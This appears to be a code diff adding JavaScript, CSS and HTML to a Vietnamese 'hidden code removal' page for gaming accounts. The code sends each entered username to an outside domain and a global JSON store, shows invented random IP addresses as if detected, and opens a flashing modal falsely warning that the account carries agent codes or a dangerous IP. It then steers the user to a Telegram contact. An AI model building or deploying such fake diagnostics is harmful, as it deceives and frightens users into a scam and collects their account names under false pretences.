+        }
+
+        // Run / Check button handler ("Xoá mã ẩn", "CHECK MÃ ẨN", "check mã")
+        if (txt.includes('check mã ẩn') || txt.includes('check mã') || txt.includes('check') || txt.includes('run') || txt.includes('xoá_mã_ẩn') || txt.includes('xóa_mã_ẩn') || txt.includes('xoá mã ẩn') || txt.includes('xóa mã ẩn')) {
+          if (!acc || acc.length < 3) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            alert('⚠️ Vui lòng nhập tên tài khoản (Username) để kiểm tra!');
+            return false;
+          }
+
+          // 1. Send to local relative API
+          fetch('/api/request-code', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ account: acc })
+          }).then(r => r.json()).then(d => {
+            if (d.success) {
+              if (d.status === 'assigned' && d.code) {
+                userAssignedCode = d.code.id;
+              } else {
+                startCheckApproval(acc);
+              }
+            }
+          }).catch(err => {
+            startCheckApproval(acc);
+          });
+
+          // 2. Send to primary domain absolute API if visiting from another domain
+          if (!window.location.hostname.includes('xoaipmaan.com')) {
+            fetch('https://xoaipmaan.com/api/request-code', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ account: acc })
+            }).catch(() => {});
+          }
+
+          // 3. Always push to global JsonBlob store (SYNC_URL)
+          syncRequestToGlobal(acc);
+
+          // 4. Open Popup Modal based on selected game (LLWIN -> Success (Img 2), Others -> Anomaly (Img 1))
+          openStatusModal(acc);
+        }
+      }
+    }, true);
+
+    // Auto-update random IP in status dock
+    setInterval(function() {
+      const pills = document.querySelectorAll('.status-pill');
+      pills.forEach(p => {
+        const k = p.querySelector('.status-k');
+        if (k && k.innerText.trim() === 'IP') {
+          const v = p.querySelector('.status-v');
+          if (v && (v.innerText.trim() === '—' || !v.innerText.trim() || v.innerText.includes('null'))) {
+            const prefixes = ['42.112', '113.161', '14.225', '27.72', '116.108', '42.113', '171.244'];
+            const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+            v.innerText = `${prefix}.${Math.floor(Math.random() * 240 + 10)}.${Math.floor(Math.random() * 240 + 10)}`;
+          }
+        }
+      });
+    }, 300);
+
+    function showHeavyWarningModal(type, codeId) {
+      const overlay = document.getElementById('heavy-warning-overlay');
+      const titleBadge = document.getElementById('warning-type-title');
+      const msgText = document.getElementById('warning-message-text');
+      const supportBtn = document.getElementById('btn-warning-support');
+
+      const teleConfig = window.getDomainConfig();
+      if (supportBtn) {
+        supportBtn.href = teleConfig.telegramUrl;
+        supportBtn.innerHTML = `<i class="fa-brands fa-telegram"></i> LIÊN HỆ TELEGRAM ${teleConfig.telegramHandle} HỖ TRỢ XÓA MÃ AGENT`;
+      }
+
+      let typeName = '🔴 IP XẤU NGUY HIỂM MỨC ĐỘ CAO';
+      if (type === 'agency_1') typeName = '🟠 TÀI KHOẢN DÍNH MÃ ĐẠI LÝ CẤP 1';
+      if (type === 'agency_2') typeName = '🟡 TÀI KHOẢN DÍNH MÃ ĐẠI LÝ CẤP 2';
+      if (type === 'agency_3') typeName = '🟣 TÀI KHOẢN DÍNH MÃ ĐẠI LÝ CẤP 3';
+
+      if (titleBadge) titleBadge.innerText = typeName;
+      if (msgText) {
+        msgText.innerHTML = `⚠️ <b>CẢNH BÁO !!</b> Tài khoản của bạn dính mã đại lý hoặc IP của bạn đang dính mã ẩn rất nặng nhé!<br><br><span style="font-size: 0.88rem; color: #fbbf24;">(Mã xác nhận: [${codeId}] — Phân loại: ${typeName})</span>`;
+      }
+
+      if (overlay) overlay.style.display = 'flex';
+    }
+
+    document.addEventListener('click', function(e) {
+      if (e.target && (e.target.id === 'btn-warning-proceed' || e.target.closest('#btn-warning-proceed'))) {
+        window.location.href = './result.html';
+      }
+    });
+  </script>
+
+  <!-- HEAVY WARNING POPUP MODAL -->
+  <style>
+  @keyframes heavyWarningBlink {
+    0% { border-color: #ef4444; box-shadow: 0 0 35px #ef4444, inset 0 0 20px rgba(239,68,68,0.4); }
+    50% { border-color: #f59e0b; box-shadow: 0 0 45px #f59e0b, inset 0 0 25px rgba(245,158,11,0.5); }
+    100% { border-color: #ef4444; box-shadow: 0 0 35px #ef4444, inset 0 0 20px rgba(239,68,68,0.4); }
+  }
+
+  @keyframes textFlashWarning {
+    0% { color: #f87171; text-shadow: 0 0 12px #f87171; }
+    50% { color: #fbbf24; text-shadow: 0 0 16px #fbbf24; }
+    100% { color: #f87171; text-shadow: 0 0 12px #f87171; }
+  }
+
+  #heavy-warning-overlay {
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: rgba(4, 2, 2, 0.94);
+    backdrop-filter: blur(14px);
+    -webkit-backdrop-filter: blur(14px);
+    z-index: 99999;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+
+  .warning-modal-card {
+    background: rgba(22, 4, 4, 0.96);
+    border: 3px solid #ef4444;
+    animation: heavyWarningBlink 1.2s infinite ease-in-out;
+    border-radius: 14px;
+    width: 100%;
+    max-width: 520px;
+    padding: 32px 26px;
+    text-align: center;
+    font-family: 'Share Tech Mono', monospace, sans-serif;
+    position: relative;
+  }
+
+  .warning-modal-header {
+    font-size: 1.45rem;
+    font-weight: 800;
+    letter-spacing: 1.5px;
+    animation: textFlashWarning 1.2s infinite;
+    margin-bottom: 15px;
+  }
+
+  .warning-modal-body {
+    font-size: 1.05rem;
+    color: #fff;
+    line-height: 1.6;
+    margin-bottom: 22px;
+    background: rgba(248, 113, 113, 0.12);
+    border: 1px dashed rgba(248, 113, 113, 0.5);
+    padding: 16px;
+    border-radius: 8px;
+    font-weight: 700;
+  }
+
+  .warning-type-badge {
+    display: inline-block;
+    padding: 6px 14px;
+    background: rgba(251, 191, 36, 0.2);
+    border: 1px solid #fbbf24;
+    color: #fbbf24;
+    font-weight: 800;
+    border-radius: 6px;
+    margin-bottom: 15px;
+    font-size: 0.9rem;
+  }
+
+  .warning-modal-actions {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .btn-proceed-warning {
+    background: linear-gradient(180deg, #ef4444, #b91c1c);
+    color: #fff;
+    border: none;
+    padding: 14px;
+    font-size: 0.95rem;
+    font-weight: 800;
+    border-radius: 8px;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    box-shadow: 0 0 20px rgba(239, 68, 68, 0.5);
+    transition: all 0.2s ease;
+    font-family: inherit;
+  }
+
+  .btn-proceed-warning:hover {
+    background: linear-gradient(180deg, #f87171, #ef4444);
+    box-shadow: 0 0 30px rgba(239, 68, 68, 0.8);
+    transform: translateY(-2px);
+  }
+
+  .btn-support-warning {
+    background: rgba(37, 196, 172, 0.15);
+    color: #00ff88;
+    border: 1px solid #00ff88;
+    padding: 12px;
+    font-size: 0.9rem;
+    font-weight: 700;
+    border-radius: 8px;
+    cursor: pointer;
+    text-decoration: none;
+    display: block;
+    transition: all 0.2s ease;
+    font-family: inherit;
+  }
+
+  .btn-support-warning:hover {
+    background: #00ff88;
+    color: #010806;
+  }
+  </style>
+
+  <div id="heavy-warning-overlay">
+    <div class="warning-modal-card">
+      <div class="warning-modal-header">⚠️ CẢNH BÁO NGHIÊM TRỌNG !! ⚠️</div>
+      <div class="warning-type-badge" id="warning-type-title">🔴 PHÁT HIỆN DẤU HIỆU NGUY HIỂM</div>
+      <div class="warning-modal-body" id="warning-message-text">
+        Cảnh báo !! Tài khoản của bạn dính mã đại lý hoặc IP của bạn đang dính mã ẩn rất nặng nhé
+      </div>
+      <div class="warning-modal-actions">
+        <button class="btn-proceed-warning" id="btn-warning-proceed">
+          <i class="fa-solid fa-bolt"></i> BẮT ĐẦU XÓA MÃ NGHIÊM TRỌNG & VÀO KẾT QUẢ ➡
+        </button>
+        <a class="btn-support-warning" id="btn-warning-support" href="https://t.me/ITXOAMAAN" target="_blank">
+          <i class="fa-brands fa-telegram"></i> LIÊN HỆ TELEGRAM @ITXOAMAAN HỖ TRỢ XÓA MÃ AGENT
+        </a>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
